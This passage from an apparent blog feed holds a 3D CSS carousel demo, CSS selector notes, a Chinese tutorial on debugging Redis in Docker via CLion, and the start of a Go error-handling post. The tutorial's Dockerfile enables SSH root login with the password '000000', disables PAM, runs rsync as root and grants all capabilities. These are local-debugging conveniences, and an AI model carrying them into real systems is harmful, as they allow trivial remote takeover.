class="attribute">margin-left</span>:-<span class="number">600px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">margin-top</span>:-<span class="number">600px</span>;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="attribute">background</span>: <span class="built_in">radial-gradient</span>(<span class="built_in">rgb</span>(<span class="number">50</span>,<span class="number">50</span>,<span class="number">50</span>), <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>) <span class="number">70%</span>);</span></span><br><span class="line"><span class="language-css">        <span class="attribute">transform</span>: <span class="built_in">translateY</span>(<span class="number">110px</span>) <span class="built_in">rotateX</span>(<span class="number">90deg</span>);</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> &gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">window</span>.<span class="property">onload</span>=<span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> wrap=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;wrap&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> divs=<span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&quot;#wrap&gt;div&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> refs=<span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&quot;#wrap div div&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> rotate=<span class="number">360</span>/divs.<span class="property">length</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;divs.<span class="property">length</span>;i++)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">//          the inverted img</span></span></span><br><span class="line"><span class="language-javascript">          refs[i].<span class="property">style</span>.<span class="property">background</span>=<span class="string">&#x27;linear-gradient(rgb(0,0,0) 40%,rgba(0,0,0,0)),url(img/&#x27;</span>+(i+<span class="number">1</span>)+<span class="string">&#x27;.jpg)&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">//          anonymous function and closure</span></span></span><br><span class="line"><span class="language-javascript">          (<span class="keyword">function</span>(<span class="params">i</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">//                After 2000, 1800, 1600 ... seconds to run transform(1s)</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">//                The first page was last runner</span></span></span><br><span class="line"><span class="language-javascript">              divs[i].<span class="property">style</span>.<span class="property">transform</span>=<span class="string">&#x27;rotateY(&#x27;</span>+i*rotate+<span class="string">&#x27;deg) translateZ(400px)&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;,(divs.<span class="property">length</span>-i)*<span class="number">200</span>);</span></span><br><span class="line"><span class="language-javascript">          &#125;)(i);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">//      When the fist img was run at the end position</span></span></span><br><span class="line"><span class="language-javascript">        divs[<span class="number">0</span>].<span class="title function_">addEventListener</span>(<span class="string">&#x27;transitionend&#x27;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="title function_">drag</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">drag</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">let</span> curX=<span class="number">0</span>;           <span class="comment">//init circle value</span></span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">let</span> curY=-<span class="number">10</span>;     <span class="comment">//init circle value</span></span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">let</span> timer;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">document</span>.<span class="property">onmousedown</span>=<span class="keyword">function</span>(<span class="params">ev</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="built_in">clearInterval</span>(timer);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> startTime=<span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>();     <span class="comment">//when you mouse down</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> disX=ev.<span class="property">clientX</span>;    <span class="comment">//the start point</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> disY=ev.<span class="property">clientY</span>;    <span class="comment">//the start point</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">             * Last stop point</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">             * Every mouse down need set the lastXY</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">             */</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> lastX=curX;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> lastY=curY;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">/*note the speed*/</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> speedX=<span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> speedY=<span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="property">onmousemove</span>=<span class="keyword">function</span>(<span class="params">ev</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">              curX=lastX+(ev.<span class="property">clientX</span>-disX)/<span class="number">10</span>;</span></span><br><span class="line"><span class="language-javascript">              curY=lastY+(disY-ev.<span class="property">clientY</span>)/<span class="number">10</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">              wrap.<span class="property">style</span>.<span class="property">transform</span>=<span class="string">&#x27;perspective(1000px) rotateX(&#x27;</span>+curY+<span class="string">&#x27;deg) rotateY(&#x27;</span>+curX+<span class="string">&#x27;deg)&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">              <span class="comment">//drag distance by the mouse move distance</span></span></span><br><span class="line"><span class="language-javascript">              <span class="comment">//so you need calc the</span></span></span><br><span class="line"><span class="language-javascript">              speedX=(ev.<span class="property">clientX</span>-disX)/<span class="number">100</span>;</span></span><br><span class="line"><span class="language-javascript">              speedY=(disY-ev.<span class="property">clientY</span>)/<span class="number">100</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="property">onmouseup</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">              <span class="variable language_">document</span>.<span class="property">onmousemove</span>=<span class="literal">null</span>;</span></span><br><span class="line"><span class="language-javascript">              <span class="keyword">let</span> endTime=<span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>();         <span class="comment">//note the mouse up time</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">              <span class="keyword">if</span>(endTime-startTime&lt;<span class="number">300</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                timer=<span class="built_in">setInterval</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                  curX+=speedX;</span></span><br><span class="line"><span class="language-javascript">                  curY+=speedY;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                  <span class="comment">//friction force</span></span></span><br><span class="line"><span class="language-javascript">                  speedX*=<span class="number">0.95</span>;</span></span><br><span class="line"><span class="language-javascript">                  speedY*=<span class="number">0.95</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                  <span class="comment">//stop condition</span></span></span><br><span class="line"><span class="language-javascript">                  <span class="keyword">if</span>(<span class="title class_">Math</span>.<span class="title function_">abs</span>(speedX)&lt;<span class="number">0.1</span> &amp;&amp; <span class="title class_">Math</span>.<span class="title function_">abs</span>(speedY)&lt;<span class="number">0.1</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="built_in">clearInterval</span>(timer);</span></span><br><span class="line"><span class="language-javascript">                  &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                  wrap.<span class="property">style</span>.<span class="property">transform</span>=<span class="string">&#x27;perspective(1000px) rotateX(&#x27;</span>+curY+<span class="string">&#x27;deg) rotateY(&#x27;</span>+curX+<span class="string">&#x27;deg)&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                &#125;,<span class="number">16</span>);</span></span><br><span class="line"><span class="language-javascript">              &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">          &#125;;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;wrap&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;img/1.jpg&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;img/2.jpg&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> &gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;img/3.jpg&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> &gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;img/4.jpg&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;img/5.jpg&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;img/6.jpg&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;img/7.jpg&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;img/8.jpg&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;img/9.jpg&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;img/10.jpg&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="Css"><a href="#Css" class="headerlink" title="Css"></a>Css</h2><h3 id="Css-Diner"><a href="#Css-Diner" class="headerlink" title="Css Diner"></a>Css Diner</h3><h4 id="Select-what-you-want"><a href="#Select-what-you-want" class="headerlink" title="Select what you want."></a>Select what you want.</h4><ol>
<li><p><strong>A + B</strong> This selects all B elements that directly follow A. Elements that follow one another are called siblings. They’re on the same level, or depth. In the HTML markup for this level, elements that have the same indentation are siblings. <em>Examples</em> <code>p + .intro</code> selects every element with class&#x3D;”intro” that directly follows a p <code>div + a</code> selects every a element that directly follows a <code>&lt;div&gt;</code></p>
</li>
<li><p><strong>A ~ B</strong> You can select all siblings of an element that follow it. This is like the Adjacent Selector (A + B) except it gets all of the following elements instead of one. <em>Examples</em> <code>A ~ B</code> selects all B that follow a A</p>
</li>
<li><p><strong>A &gt; B</strong> You can select elements that are direct children of other elements. A child element is any element that is nested directly in another element. Elements that are nested deeper than that are called descendant elements. <em>Examples</em> <code>A &gt; B</code> selects all B that are a direct children A</p>
</li>
<li><p><strong>:nth-of-type[An+B]</strong> The nth-of-type formula selects every nth element, starting the count at a specific instance of that element. <em>Examples</em> <code>span:nth-of-type(6n+2)</code> selects every 6th instance of a span, starting from (and including) the second instance.</p>
</li>
<li><p><strong>:empty</strong> Selects elements that don’t have any other elements inside of them. <em>Examples</em> <code>div:empty</code> selects all empty div elements.</p>
</li>
<li><p><strong>:not(X)</strong> You can use this to select all elements that do not match selector “X”. <em>Examples</em> <code>:not(#fancy)</code> selects all elements that do not have id&#x3D;”fancy”. <code>div:not(:first-child)</code> selects every div that is not a first child. <code>:not(.big, .medium)</code> selects all elements that do not have class&#x3D;”big” or class&#x3D;”medium”.</p>
</li>
<li><p><em><em>[attribute</em>&#x3D;”value”]</em>* A useful selector if you can identify a common pattern in things like class, href or src attributes. <em>Examples</em> <code>img[src*=&quot;/thumbnails/&quot;]</code> selects all image elements that show images from the <code>&quot;thumbnails&quot;</code> folder.</p>
<p><code>[class*=&quot;heading&quot;]</code> selects all elements with “heading” in their class, like <code>class=&quot;main-heading&quot;</code> and <code>class=&quot;sub-heading&quot;</code>.</p>
</li>
</ol>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>3d</tag>
        <tag>animation</tag>
        <tag>css</tag>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>Clion remote debug docker redis</title>
    <url>/2021/07/17/gdb-debug-remote/</url>
    <content><![CDATA[<h1 id="Clion-remote-debug-docker-redis"><a href="#Clion-remote-debug-docker-redis" class="headerlink" title="Clion remote debug docker redis"></a>Clion remote debug docker redis</h1><h2 id="垃圾MAC-m1"><a href="#垃圾MAC-m1" class="headerlink" title="垃圾MAC m1"></a>垃圾MAC m1</h2><p>redis 版本用的是官方的 5.0, 鲁迅说的用 5.0，<code>中国人的性情总是喜欢调和、折中的，譬如你说，这屋子太暗，说在这里开一个天窗，大家一定是不允许的。但如果你主张拆掉屋顶，他们就会来调和，愿意开天窗了</code></p>
<p>关于 docker, 嘿嘿我不会，所以网上找了找试了试大致凭直觉猜了猜貌似还可以</p>
<p>因为 m1 现在看起来好像什么都不太支持，所以本教程倾向于一切都靠docker里的，只保留和docker的通信</p>
<h2 id="首先-docker-下官方-m1-适配的"><a href="#首先-docker-下官方-m1-适配的" class="headerlink" title="首先 docker 下官方 m1 适配的"></a>首先 docker 下官方 m1 适配的</h2><p>容器相关的文件如下</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">FROM ubuntu:latest</span><br><span class="line"></span><br><span class="line">RUN apt-get update</span><br><span class="line"></span><br><span class="line">RUN apt-get install -y build-essential</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">因为cmake安装的时候会出现交互选项，就是让你按y，选语言啥的，所以加了这个选项</span></span><br><span class="line">RUN DEBIAN_FRONTEND=&#x27;noninteractive&#x27;  apt-get install -y cmake</span><br><span class="line"></span><br><span class="line">RUN apt-get install -y gdb</span><br><span class="line"></span><br><span class="line">RUN apt-get install -y openssh-server</span><br><span class="line">RUN mkdir /var/run/sshd</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这里注意下和实际的ubuntu配置对比下</span></span><br><span class="line">RUN sed -ri &#x27;s/^#PermitRootLogin\s+.*/PermitRootLogin yes/&#x27; /etc/ssh/sshd_config</span><br><span class="line">RUN sed -ri &#x27;s/UsePAM yes/#UsePAM yes/g&#x27; /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line">RUN apt-get install -y rsync</span><br><span class="line">RUN sed -ri &#x27;s/RSYNC_ENABLE=false/RSYNC_ENABLE=true/g&#x27; /etc/default/rsync</span><br><span class="line">COPY rsync.conf /etc</span><br><span class="line"></span><br><span class="line">RUN echo &#x27;root:000000&#x27; |chpasswd</span><br><span class="line"></span><br><span class="line">RUN mkdir /root/sync</span><br><span class="line"></span><br><span class="line">COPY entrypoint.sh /sbin</span><br><span class="line">RUN chmod +x /sbin/entrypoint.sh</span><br><span class="line">ENTRYPOINT [ &quot;/sbin/entrypoint.sh&quot; ]</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>常见的软件就不用说了, rsync就是个传文件的，上面配置中涉及的额外两个文件</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">rsync.conf</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编辑配置信息</span></span><br><span class="line">max connections = 8</span><br><span class="line">log file = /var/log/rsync.log</span><br><span class="line">timeout = 300</span><br><span class="line"></span><br><span class="line">[sync] # 模块名</span><br><span class="line">comment = sync</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">path为需要同步的文件夹路径</span></span><br><span class="line">path = /root/sync</span><br><span class="line">read only = no</span><br><span class="line">list = yes</span><br><span class="line">uid = root</span><br><span class="line">gid = root</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">entrypoint.sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">/usr/bin/rsync --daemon --config=/etc/rsync.conf</span><br><span class="line">/usr/sbin/sshd -D</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>最后准备一个 compose, 看起来应该是 Dockerfile 的最后五十米</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">version: &quot;3&quot;</span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  env:</span><br><span class="line">    build: .</span><br><span class="line">    container_name: clion-gdb</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;45678:22&quot;</span><br><span class="line">      - &quot;8730:873&quot;</span><br><span class="line">    cap_add:</span><br><span class="line">      - ALL</span><br></pre></td></tr></table></figure></div>

<p>如果以上觉得太麻烦的话，直接下这个文件夹也行</p>
<p><a class="link"   href="https://github.com/ReZeroS/zerobox/tree/master/docker-clion" >clion with docker<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>准备好这个文件夹后， <code>docker-compose up -d</code><br>容器的安装操作其实就是下载这个文件夹然后执行这一条命令</p>
<h3 id="后面的-Clion-就是参考这个链接了"><a href="#后面的-Clion-就是参考这个链接了" class="headerlink" title="后面的 Clion 就是参考这个链接了"></a>后面的 <code>Clion</code> 就是参考这个链接了</h3><p><a class="link"   href="https://www.jetbrains.com/help/clion/remote-projects-support.html" >full remote debug<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<ol>
<li><p>先 toolchain里配置下, 大致就是填个 ssh 连接, 确保能测通就行</p>
<ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2021/07/17/gdb-debug-remote/img.png"
                      class="" title="!-[img.png](gdb-debug-remote&#x2F;img.png)"
                ></li>
</ul>
</li>
<li><p>下载好 <code>redis</code> 源码的时候 会识别成 <code>make</code> 项目, 这里我不会 <code>cmake</code>，所以就按 <code>make</code> 来吧</p>
<ul>
<li>Preferences | Build, Execution, Deployment | Makefile 配置项里只选你刚才配置的那个 <code>toolchain</code> 即可</li>
</ul>
</li>
<li><p>然后就是文件的上传下载配置了，·Preferences | Build, Execution, Deployment | Deployment</p>
<ul>
<li>配置下 SFTP，用户密码，其实配了个刚才的ssh后直接选就行了, 其次就是第二个选项卡，配置下本地的项目路径和远程的目标路径<ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2021/07/17/gdb-debug-remote/clion-sftp.png"
                      class="" title="!-[img.png](gdb-debug-remote&#x2F;clion-sftp.png)"
                >
</li>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2021/07/17/gdb-debug-remote/clion-sftp2.png"
                      class="" title="!-[img.png](gdb-debug-remote&#x2F;clion-sftp2.png)"
                ></li>
</ul>
</li>
</ul>
</li>
<li><p>这一步配好之后右键项目目录，选 Deployment, 把本地的目录上传到远程的 <code>/root/sync</code> 目录即可</p>
</li>
</ol>
<h3 id="然后就是我尝试出来但最不理解的一步了"><a href="#然后就是我尝试出来但最不理解的一步了" class="headerlink" title="然后就是我尝试出来但最不理解的一步了"></a>然后就是我尝试出来但最不理解的一步了</h3><p>官方说让选远程的可执行文件，没明白为啥不是直接调远程的编译然后再选择</p>
<ol>
<li>所以进入容器 <code>docker exec -it container-hash /bin/bash</code></li>
<li>然后进入目标目录 <code>cd /root/sync/src</code> , 先 <code>chmod +x src/mkreleasehdr.sh &amp;&amp; ./mkreleasehdr.sh</code></li>
<li>再然后 <code>make</code> 一下, 就会在 <code>src</code> 目录下生成 <code>redis-server</code> 的可执行文件，打印下这个路径拷贝出来</li>
<li><code>Clion</code> clone redis 项目后会自动识别出来可运行的 <code>configurations</code>, 我们选中其中的 <code>redis-server</code>, 只更改 <code>executable</code> 把执行文件的路径填进去</li>
<li>然后去 <code>redis-server.c</code> 中的 main 打个断点即可</li>
</ol>
<ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2021/07/17/gdb-debug-remote/success.png"
                      class="" title="!-[img.png](gdb-debug-remote&#x2F;clion-sftp2.png)"
                ></li>
</ul>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>Clion</tag>
        <tag>debug</tag>
      </tags>
  </entry>
  <entry>
    <title>Go exception handle</title>
    <url>/2020/09/18/go-exception-handle/</url>
    <content><![CDATA[<p>原文链接：<a class="link"   href="https://blog.golang.org/error-handling-and-go" >https://blog.golang.org/error-handling-and-go<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<div class="code-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Open</span><span class="params">(name <span class="type">string</span>)</span></span> (file *File, err <span class="type">error</span>)</span><br><span class="line"></span><br><span class="line">f, err := os.Open(<span class="string">&quot;filename.ext&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// do something with the open *File f</span></span><br></pre></td></tr></table></figure></div>

<ol>
<li><p>函数的返回值附带一个 <code>error</code> 作为异常返回，当出现异常时其不为 nil</p>
</li>
<li><p><code>error</code> 是接口类型，只包含了一个字符串做描述，因此可以自己做实现。</p>
<blockquote>
<p>tips： Go 不需要显示的声明自己实现了什么接口，只要实现了接口的方法就代表实现了该接口，如下<br> <div class="code-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Shaper <span class="keyword">interface</span> &#123;</span><br><span class="line">     Area() <span class="type">float32</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">type</span> Square <span class="keyword">struct</span> &#123;</span><br><span class="line">     side <span class="type">float32</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">func</span> <span class="params">(sq *Square)</span></span> Area() <span class="type">float32</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> sq.side * sq.side</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">     sq1 := <span class="built_in">new</span>(Square)</span><br><span class="line">     sq1.side = <span class="number">5</span></span><br><span class="line"> </span><br><span class="line">     <span class="keyword">var</span> areaIntf Shaper</span><br><span class="line">     areaIntf = sq1</span><br><span class="line">     <span class="comment">// shorter,without separate declaration:</span></span><br><span class="line">     <span class="comment">// areaIntf := Shaper(sq1)</span></span><br><span class="line">     <span class="comment">// or even:</span></span><br><span class="line">     <span class="comment">// areaIntf := sq1</span></span><br><span class="line">     fmt.Printf(<span class="string">&quot;The square has area: %f\n&quot;</span>, areaIntf.Area())</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></div></p>
</blockquote>
</li>
<li><p>异常扩展实现时断言的优雅处理</p>
<ul>
<li>golang的语言中提供了断言的功能。golang中的所有程序都实现了interface{}的接口，这意味着，所有的类型如string,int,int64甚至是自定义的struct类型都就此拥有了interface{}的接口，这种做法和java中的Object类型比较类似。那么在一个数据通过func funcName(interface{})的方式传进来的时候，也就意味着这个参数被自动的转为interface{}的类型。</li>
<li>果断言失败，那么ok的值将会是false,但是如果断言成功ok的值将会是true,同时value将会得到所期待的正确的值</li>
</ul>
